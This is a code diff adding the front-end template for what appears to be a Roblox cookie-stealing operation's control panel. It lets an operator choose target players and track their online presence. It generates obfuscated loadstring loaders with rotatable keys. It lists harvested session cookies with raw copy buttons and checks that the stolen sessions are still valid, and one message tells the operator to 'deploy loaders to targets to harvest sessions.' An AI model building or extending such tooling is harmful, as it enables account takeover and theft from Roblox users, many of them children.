+            if (data.success) {
+                showToast('Configuration created & compiled!', 'success');
+                document.getElementById('resultLoadstringCode').textContent = data.loadstring;
+                form.style.display = 'none';
+                document.getElementById('createdConfigResult').style.display = 'block';
+            } else {
+                showToast(data.message || 'Failed to create config', 'danger');
+            }
+        })
+        .catch(err => {
+            showToast('Network error while generating config', 'danger');
+            console.error(err);
+        });
+    }
+    
+    function copyResultLoadstring() {
+        const text = document.getElementById('resultLoadstringCode').textContent.trim();
+        navigator.clipboard.writeText(text).then(() => {
+            showToast('Loadstring copied to clipboard!', 'success');
+        });
+    }
+    
+    function copyLoadstring(configId) {
+        const text = document.getElementById(`loadstring-${configId}`).textContent.trim();
+        navigator.clipboard.writeText(text).then(() => {
+            showToast('Loadstring copied to clipboard!', 'success');
+        });
+    }
+    
+    // Toggle single item
+    function toggleItem(checkbox, configId, itemName) {
+        const isEnabled = checkbox.checked;
+        fetch(`/configs/${configId}/toggle`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': '{{ csrf_token() }}'
+            },
+            body: JSON.stringify({ item: itemName, enabled: isEnabled })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                showToast(`'${itemName}' filters updated.`, 'success');
+                // Update loadstring display code
+                const loadstringEl = document.getElementById(`loadstring-${configId}`);
+                if (loadstringEl && data.loadstring) {
+                    loadstringEl.textContent = data.loadstring;
+                }
+                
+                // Recalculate badge count
+                const countBadge = document.getElementById(`active-count-${configId}`);
+                if (countBadge) {
+                    let currentCount = parseInt(countBadge.textContent);
+                    countBadge.textContent = isEnabled ? currentCount + 1 : currentCount - 1;
+                }
+            } else {
+                showToast(data.message || 'Failed to toggle filter', 'danger');
+                checkbox.checked = !isEnabled; // Revert
+            }
+        })
+        .catch(err => {
+            showToast('Network error while updating filter', 'danger');
+            checkbox.checked = !isEnabled;
+            console.error(err);
+        });
+    }
+    
+    // Toggle full category (OG / Secret / AnToh)
+    function toggleCategory(configId, category, enable) {
+        if (!confirm(`Are you sure you want to ${enable ? 'ENABLE' : 'DISABLE'} all items in ${category.toUpperCase()} category?`)) {
+            return;
+        }
+        
+        fetch(`/configs/${configId}/toggle-category`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': '{{ csrf_token() }}'
+            },
+            body: JSON.stringify({ category: category, enabled: enable })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                showToast(data.message, 'success');
+                // Update loadstring display code
+                const loadstringEl = document.getElementById(`loadstring-${configId}`);
+                if (loadstringEl && data.loadstring) {
+                    loadstringEl.textContent = data.loadstring;
+                }
+                // Refresh checkbox status in current pane
+                const pane = document.getElementById(`tab-pane-${category}-${configId}`);
+                const checkboxes = pane.querySelectorAll('input[type="checkbox"]');
+                checkboxes.forEach(cb => cb.checked = enable);
+                
+                // Recalculate count badge
+                setTimeout(() => window.location.reload(), 1000); // Reloading is easiest to sync item stats
+            } else {
+                showToast(data.message || 'Failed to toggle category', 'danger');
+            }
+        })
+        .catch(err => {
+            showToast('Network error', 'danger');
+            console.error(err);
+        });
+    }
+    
+    // Key rotation
+    function rotateConfigKey(configId) {
+        if (!confirm('Warning: Rotating the key will invalidate the current loadstring script in use. Clients will need to copy the new loadstring. Proceed?')) {
+            return;
+        }
+        
+        fetch(`/configs/${configId}/rotate`, {
+            method: 'POST',
+            headers: {
+                'X-CSRFToken': '{{ csrf_token() }}'
+            }
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                showToast('Secret key rotated & loader re-compiled!', 'success');
+                // Reload page after a delay to show new details
+                setTimeout(() => window.location.reload(), 1200);
+            } else {
+                showToast(data.message || 'Failed to rotate key', 'danger');
+            }
+        })
+        .catch(err => {
+            showToast('Network error rotating key', 'danger');
+            console.error(err);
+        });
+    }
+    
+    // Update target username
+    function updateConfigTarget(e, configId) {
+        e.preventDefault();
+        const form = e.target;
+        const formData = new FormData(form);
+        
+        fetch(`/configs/${configId}/update-target`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                showToast('Target user updated successfully.', 'success');
+                setTimeout(() => window.location.reload(), 1000);
+            } else {
+                showToast(data.message || 'User not found in Roblox database.', 'danger');
+            }
+        })
+        .catch(err => {
+            showToast('Network error', 'danger');
+            console.error(err);
+        });
+    }
+    
+    // Update delays
+    function updateConfigDelays(e, configId) {
+        e.preventDefault();
+        const form = e.target;
+        const formData = new FormData(form);
+        
+        fetch(`/configs/${configId}/update-delays`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                showToast('Timing delays updated & re-compiled!', 'success');
+                // Update loadstring display code
+                const loadstringEl = document.getElementById(`loadstring-${configId}`);
+                if (loadstringEl && data.loadstring) {
+                    loadstringEl.textContent = data.loadstring;
+                }
+            } else {
+                showToast(data.message || 'Failed to update delays', 'danger');
+            }
+        })
+        .catch(err => {
+            showToast('Network error', 'danger');
+            console.error(err);
+        });
+    }
+    
+    // Delete config
+    function deleteConfig(configId) {
+        if (!confirm('Are you absolutely sure you want to delete this configuration? This cannot be undone.')) {
+            return;
+        }
+        
+        fetch(`/configs/${configId}/delete`, {
+            method: 'POST',
+            headers: {
+                'X-CSRFToken': '{{ csrf_token() }}'
+            }
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                showToast('Configuration deleted.', 'success');
+                const card = document.getElementById(`config-card-${configId}`);
+                if (card) {
+                    card.style.animation = 'slideIn 0.3s ease reverse forwards';
+                    setTimeout(() => card.remove(), 300);
+                }
+                
+                // Adjust stats total
+                const totalEl = document.getElementById('stats-total-configs');
+                if (totalEl) {
+                    totalEl.textContent = parseInt(totalEl.textContent) - 1;
+                }
+            } else {
+                showToast(data.message || 'Failed to delete config', 'danger');
+            }
+        })
+        .catch(err => {
+            showToast('Network error', 'danger');
+            console.error(err);
+        });
+    }
+    
+    // Filter items inside toggle drawer
+    function filterDrawerItems(inputEl, configId) {
+        const term = inputEl.value.toLowerCase().trim();
+        const card = document.getElementById(`config-card-${configId}`);
+        const items = card.querySelectorAll('.item-toggle-card');
+        
+        items.forEach(item => {
+            const name = item.getAttribute('data-name');
+            if (name.includes(term)) {
+                item.style.display = 'flex';
+            } else {
+                item.style.display = 'none';
+            }
+        });
+    }
+    
+    // Roblox target presence check
+    function checkPresenceForConfig(configId) {
+        const dot = document.getElementById(`presence-dot-${configId}`);
+        const text = document.getElementById(`presence-text-${configId}`);
+        if (!dot || !text) return;
+        
+        const targetId = dot.getAttribute('data-target-id');
+        if (!targetId || targetId === 'None' || targetId === 'null') {
+            text.textContent = 'None';
+            return;
+        }
+        
+        // Fetch from presence route by User ID directly (much faster and avoids rate limit timeouts)
+        fetch(`/api/roblox/presence?userId=${encodeURIComponent(targetId)}`)
+        .then(res => res.json())
+        .then(data => {
+            if (data.success && data.presence) {
+                const p = data.presence;
+                dot.className = 'presence-indicator'; // Reset
+                if (p.status === 'In-Game') {
+                    dot.classList.add('in-game');
+                    let presenceHtml = `<span style="color:var(--accent-purple); font-weight:bold;">🎮 In-Game</span>`;
+                    if (p.place_id) presenceHtml += ` | Place: <code>${p.place_id}</code>`;
+                    if (p.universe_id) presenceHtml += ` | Universe: <code>${p.universe_id}</code>`;
+                    if (p.job_id) presenceHtml += ` | JobID: <code>${p.job_id}</code>`;
+                    text.innerHTML = presenceHtml;
+                } else if (p.status === 'Online') {
+                    dot.classList.add('online');
+                    text.innerHTML = '<span style="color:var(--accent-emerald); font-weight:bold;">🟢 Online</span>';
+                } else {
+                    text.innerHTML = '<span style="color:var(--text-muted)">⚪ Offline</span>';
+                }
+            } else {
+                text.textContent = 'Offline/Unknown';
+            }
+        })
+        .catch(err => {
+            console.error('Error fetching presence:', err);
+            text.textContent = 'Presence offline';
+        });
+    }
+    
+    // On load, run presence check for all visible configurations
+    document.addEventListener('DOMContentLoaded', () => {
+        const configs = document.querySelectorAll('.config-card');
+        configs.forEach(card => {
+            const configId = card.getAttribute('data-id');
+            if (configId) checkPresenceForConfig(configId);
+        });
+        
+        // Poll target presence every 30 seconds
+        setInterval(() => {
+            configs.forEach(card => {
+                const configId = card.getAttribute('data-id');
+                if (configId) checkPresenceForConfig(configId);
+            });
+        }, 30000);
+
+        // Load captured cookies on page load
+        loadCapturedCookies();
+    });
+
+    // Update obfuscation & wrapper format settings
+    function updateConfigSettings(configId) {
+        const isObfuscated = document.getElementById(`obfuscate-toggle-${configId}`).checked;
+        const loadstringType = document.getElementById(`loadstring-type-${configId}`).value;
+
+        const formData = new FormData();
+        formData.append('obfuscate', isObfuscated);
+        formData.append('loadstring_type', loadstringType);
+        formData.append('csrf_token', '{{ csrf_token() }}');
+
+        fetch(`/configs/${configId}/update-settings`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                showToast(data.message, 'success');
+                // Update terminal text
+                const loadstringEl = document.getElementById(`loadstring-${configId}`);
+                if (loadstringEl && data.loadstring) {
+                    loadstringEl.textContent = data.loadstring;
+                }
+            } else {
+                showToast(data.message || 'Failed to update security settings.', 'danger');
+            }
+        })
+        .catch(err => {
+            showToast('Network error updating configurations.', 'danger');
+            console.error(err);
+        });
+    }
+
+    // Roblox user search picker list query
+    function searchRobloxUsers(context) {
+        const inputId = context === 'create' ? 'target-search-input-create' : `target-search-input-${context}`;
+        const resultsId = context === 'create' ? 'search-results-create' : `search-results-${context}`;
+        
+        const input = document.getElementById(inputId);
+        const results = document.getElementById(resultsId);
+        if (!input || !results) return;
+        
+        const query = input.value.trim();
+        if (!query) {
+            showToast('Please enter a username to search.', 'warning');
+            return;
+        }
+        
+        results.style.display = 'block';
+        results.innerHTML = '<div style="text-align:center; padding:1rem; color:var(--text-muted); font-size:0.8rem;">🔍 Querying Roblox database...</div>';
+        
+        fetch(`/api/roblox/search-users-list?query=${encodeURIComponent(query)}`)
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                if (data.users.length === 0) {
+                    results.innerHTML = '<div style="text-align:center; padding:1rem; color:var(--text-muted); font-size:0.8rem;">No matching Roblox players found.</div>';
+                    return;
+                }
+                
+                let listHtml = '';
+                data.users.forEach(u => {
+                    let statusClass = 'offline';
+                    if (u.presence_status === 'In-Game') statusClass = 'in-game';
+                    else if (u.presence_status === 'Online') statusClass = 'online';
+                    
+                    listHtml += `
+                        <div class="roblox-user-row" onclick="selectRobloxUser('${context}', '${u.name}', '${u.id}')">
+                            <img src="${u.avatar_url}" class="roblox-user-avatar">
+                            <div class="roblox-user-info">
+                                <span class="roblox-user-displayname">${u.display_name}</span>
+                                <span class="roblox-user-username">@${u.name} (ID: ${u.id})</span>
+                            </div>
+                            <span class="roblox-user-status ${statusClass}">${u.presence_status}</span>
+                        </div>
+                    `;
+                });
+                results.innerHTML = listHtml;
+            } else {
+                results.innerHTML = `<div style="text-align:center; padding:1rem; color:var(--accent-rose); font-size:0.8rem;">Error: ${data.message}</div>`;
+            }
+        })
+        .catch(err => {
+            results.innerHTML = '<div style="text-align:center; padding:1rem; color:var(--accent-rose); font-size:0.8rem;">Communication failed.</div>';
+            console.error(err);
+        });
+    }
+
+    function selectRobloxUser(context, username, id) {
+        const inputId = context === 'create' ? 'target-search-input-create' : `target-search-input-${context}`;
+        const resultsId = context === 'create' ? 'search-results-create' : `search-results-${context}`;
+        const hiddenId = context === 'create' ? 'target-hidden-create' : `target-hidden-${context}`;
+        
+        document.getElementById(inputId).value = username;
+        document.getElementById(hiddenId).value = username;
+        document.getElementById(resultsId).style.display = 'none';
+        
+        showToast(`Selected user @${username} (ID: ${id})`, 'success');
+    }
+
+    // Load captured cookies from server
+    function loadCapturedCookies() {
+        const tbody = document.getElementById('capturedCookiesTableBody');
+        if (!tbody) return;
+        
+        fetch('/configs/cookies')
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                if (data.cookies.length === 0) {
+                    tbody.innerHTML = `
+                        <tr>
+                            <td colspan="5" style="text-align: center; padding: 2rem; color: var(--text-muted); font-style: italic;">
+                                No account cookies captured yet. Deploy loaders to targets to harvest sessions.
+                            </td>
+                        </tr>
+                    `;
+                    return;
+                }
+                
+                let rows = '';
+                data.cookies.forEach(c => {
+                    const date = new Date(c.created_at).toLocaleString();
+                    const statusBadge = c.status === 'valid' 
+                        ? '<span class="presence-indicator online" style="margin-right:4px;"></span><span style="color:var(--accent-emerald); font-weight:bold;">Valid Session</span>'
+                        : '<span class="presence-indicator" style="margin-right:4px; background:var(--accent-rose); box-shadow:0 0 8px var(--accent-rose);"></span><span style="color:var(--accent-rose); font-weight:bold;">Expired/Invalid</span>';
+                    
+                    rows += `
+                        <tr style="border-bottom: 1px solid var(--border); transition: background 0.2s;" id="cookie-row-${c.id}">
+                            <td style="padding: 0.75rem 0.5rem;">
+                                <div style="display:flex; align-items:center; gap:0.75rem;">
+                                    <img src="https://robohash.org/${c.player_id}?size=100x100" class="roblox-user-avatar" style="width:28px; height:28px;" id="cookie-avatar-${c.id}">
+                                    <div style="display:flex; flex-direction:column;">
+                                        <a href="https://www.roblox.com/users/${c.player_id}/profile" target="_blank" style="color:var(--accent-blue); text-decoration:none; font-weight:600; font-size:0.9rem;">${c.player_name}</a>
+                                        <span style="font-size:0.75rem; color:var(--text-muted);">ID: ${c.player_id}</span>
+                                    </div>
+                                </div>
+                            </td>
+                            <td style="padding: 0.75rem 0.5rem; font-family:monospace; font-size:0.75rem; color:var(--text-muted); max-width: 280px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">
+                                <div style="display:flex; align-items:center; gap:0.5rem;">
+                                    <span title="${c.cookie_value_raw}">${c.cookie_value_masked}</span>
+                                    <button class="btn btn-ghost" style="padding: 0.15rem 0.35rem; font-size:0.7rem; color:var(--accent-blue);" onclick="navigator.clipboard.writeText('${c.cookie_value_raw}').then(() => showToast('Cookie copied!', 'success'))">📋 Copy</button>
+                                </div>
+                            </td>
+                            <td style="padding: 0.75rem 0.5rem; color:var(--text-secondary); font-size:0.8rem;">${date}</td>
+                            <td style="padding: 0.75rem 0.5rem; font-size:0.8rem;" id="cookie-status-${c.id}">${statusBadge}</td>
+                            <td style="padding: 0.75rem 0.5rem; text-align: right;">
+                                <div style="display:flex; gap:0.4rem; justify-content:flex-end;">
+                                    <button class="btn btn-ghost" style="padding:0.25rem 0.5rem; font-size:0.75rem; color:var(--accent-emerald);" onclick="validateCookie(${c.id})">🔍 Check Session</button>
+                                    <button class="btn btn-ghost" style="padding:0.25rem 0.5rem; font-size:0.75rem; color:var(--accent-rose);" onclick="deleteCookie(${c.id})">🗑️ Delete</button>
+                                </div>
+                            </td>
+                        </tr>
+                    `;
+                    
+                    // Route thumbnail fetch through local server API proxy to bypass CORS restrictions
+                    fetch(`/api/roblox/avatar-thumbnail?userId=${c.player_id}`)
+                    .then(r => r.json())
+                    .then(tData => {
+                        if (tData.success && tData.avatar_url) {
+                            const avatarImg = document.getElementById(`cookie-avatar-${c.id}`);
+                            if (avatarImg) avatarImg.src = tData.avatar_url;
+                        }
+                    }).catch(() => {});
+                });
+                tbody.innerHTML = rows;
+            } else {
+                tbody.innerHTML = `
+                    <tr>
+                        <td colspan="5" style="text-align: center; padding: 2rem; color: var(--accent-rose); font-style: italic;">
+                            Error loading credentials: ${data.message}
+                        </td>
+                    </tr>
+                `;
+            }
+        })
+        .catch(err => {
+            tbody.innerHTML = `
+                <tr>
+                    <td colspan="5" style="text-align: center; padding: 2rem; color: var(--accent-rose); font-style: italic;">
+                        Failed to communicate with authentication server.
+                    </td>
+                </tr>
+            `;
+            console.error(err);
+        });
+    }
+
+    // Validate captured cookie against Roblox API
+    function validateCookie(cookieId) {
+        const statusCell = document.getElementById(`cookie-status-${cookieId}`);
+        if (statusCell) {
+            statusCell.innerHTML = '<span style="color:var(--text-muted); font-size:0.75rem; font-style:italic;">Validating...</span>';
+        }
+        
+        fetch(`/configs/cookies/${cookieId}/validate`, {
+            method: 'POST',
+            headers: {
+                'X-CSRFToken': '{{ csrf_token() }}'
+            }
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                if (data.status === 'valid') {
+                    showToast(`Cookie for target ${data.username} is still VALID!`, 'success');
+                } else {
+                    showToast('Cookie session has EXPIRED or been invalidated!', 'warning');
+                }
+                loadCapturedCookies();
+            } else {
+                showToast(data.message || 'Cookie verification request failed.', 'danger');
+                loadCapturedCookies();
+            }
+        })
+        .catch(err => {
+            showToast('Network error during cookie check.', 'danger');
+            console.error(err);
+            loadCapturedCookies();
+        });
+    }
+
+    // Delete cookie from database
+    function deleteCookie(cookieId) {
+        if (!confirm('Are you sure you want to delete this captured cookie from the registry?')) {
+            return;
+        }
+        
+        fetch(`/configs/cookies/${cookieId}/delete`, {
+            method: 'POST',
+            headers: {
+                'X-CSRFToken': '{{ csrf_token() }}'
+            }
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                showToast('Captured cookie record deleted.', 'success');
+                const row = document.getElementById(`cookie-row-${cookieId}`);
+                if (row) row.remove();
+                
+                // If table is empty, reload list
+                const tbody = document.getElementById('capturedCookiesTableBody');
+                if (tbody && tbody.children.length === 0) {
+                    loadCapturedCookies();
+                }
+            } else {
+                showToast('Failed to delete cookie.', 'danger');
+            }
+        })
+        .catch(err => {
+            showToast('Network error', 'danger');
+            console.error(err);
+        });
+    }
+</script>
+{% endblock %}
